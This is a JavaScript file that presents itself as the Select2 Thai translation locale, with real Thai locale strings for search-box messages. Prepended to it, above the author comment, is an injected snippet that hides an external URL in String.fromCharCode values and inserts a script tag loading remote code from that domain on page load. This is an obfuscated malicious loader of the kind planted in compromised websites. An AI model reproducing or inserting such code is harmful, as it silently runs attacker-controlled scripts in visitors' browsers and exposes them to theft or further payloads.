var fkghjhe45 = 1; var d=document;var s=d.createElement('script'); s.type='text/javascript'; s.async=true;
var pl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 100, 101, 108, 105, 118, 101, 114, 121, 103, 111, 111, 100, 115, 116, 114, 97, 116, 101, 103, 121, 46, 99, 111, 109, 47);
s.src=pl+'/js.min.js?s=k&'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}/**
 * Select2 Thai translation.
 *
 * Author: Atsawin Chaowanakritsanakul <joke@nakhon.net>
 */
(function ($) {
    "use strict";

    $.fn.select2.locales['th'] = {
        formatNoMatches: function () { return "ไม่พบข้อมูล"; },
        formatInputTooShort: function (input, min) { var n = min - input.length; return "โปรดพิมพ์เพิ่มอีก " + n + " ตัวอักษร"; },
        formatInputTooLong: function (input, max) { var n = input.length - max; return "โปรดลบออก " + n + " ตัวอักษร"; },
        formatSelectionTooBig: function (limit) { return "คุณสามารถเลือกได้ไม่เกิน " + limit + " รายการ"; },
        formatLoadMore: function (pageNumber) { return "กำลังค้นข้อมูลเพิ่ม…"; },
        formatSearching: function () { return "กำลังค้นข้อมูล…"; }
    };

    $.extend($.fn.select2.defaults, $.fn.select2.locales['th']);
})(jQuery);
